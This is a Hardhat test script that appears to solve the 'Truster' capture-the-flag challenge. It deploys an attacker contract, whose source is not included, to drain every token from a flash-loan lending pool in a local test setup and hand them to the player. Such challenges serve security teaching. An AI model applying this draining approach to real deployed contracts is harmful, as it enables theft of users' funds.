const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, player;
    let token, pool;

    // const TOKENS_IN_POOL = 1000000n * 10n ** 18n;
    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();

        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        pool = await (await ethers.getContractFactory('TrusterLenderPool', deployer)).deploy(token.address);
        expect(await pool.token()).to.eq(token.address);

        await token.transfer(pool.address, TOKENS_IN_POOL);
        expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);

        expect(await token.balanceOf(player.address)).to.equal(0);
    });

    it('Execution', async function () {
        const attackContract = await ethers.getContractFactory("TrusterAttacker", player);
        const attack = await attackContract.deploy(pool.address, token.address);
    
        // Attack with flash loan
        await attack.attack(TOKENS_IN_POOL);

        // Check balance of the attack contract
        let attackBalance = await token.balanceOf(attack.address);
        console.log("Attack contract balance:", attackBalance.toString());

        // Transfer tokens from attack contract to player
        await attack.connect(player).transferToPlayer(attackBalance);

        // Check balances after the transfer
        attackBalance = await token.balanceOf(attack.address);
        console.log("Attack contract balance after transfer:", attackBalance.toString());

        let playerBalance = await token.balanceOf(player.address);
        console.log("Player balance after transfer:", playerBalance.toString());

        
    });
    

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player has taken all tokens from the pool
        expect(
            await token.balanceOf(player.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await token.balanceOf(pool.address)
        ).to.equal(0);
    });
});

